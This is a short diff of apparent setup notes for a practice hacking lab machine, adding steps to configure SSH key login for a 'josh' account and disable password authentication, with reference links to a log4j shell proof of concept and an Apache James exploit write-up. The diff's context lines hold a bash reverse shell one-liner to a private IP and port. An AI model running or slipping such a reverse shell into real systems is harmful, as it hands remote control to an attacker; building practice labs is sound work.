@@ -361,8 +361,11 @@ bash -c  "bash -i >& /dev/tcp/192.168.50.245/1234 0>&1"
 * Accept the default settings
 * cat .ssh/id_rsa.pub >> ~/.ssh/authorized_keys
 * Create hidden file and add a flag in the file.
+* On you kali Linux generate ssh keys and transfer the public key to the josh account.
+* Add the key to the authorized_keys so that you can authenticate with ssh keys
 * Go to the ssh configuration file
 * Allow password authentication as well as key authentication
+* Disable password authentication
 
 
 
@@ -371,5 +374,6 @@ bash -c  "bash -i >& /dev/tcp/192.168.50.245/1234 0>&1"
 * https://github.com/kozmer/log4j-shell-poc
 * https://phoenixnap.com/kb/ubuntu-samba
 * https://crimsonglow.ca/~kjiwa/2016/06/exploiting-apache-james-2.3.2.html
+* https://www.digitalocean.com/community/tutorials/how-to-configure-ssh-key-based-authentication-on-a-linux-server
 
 
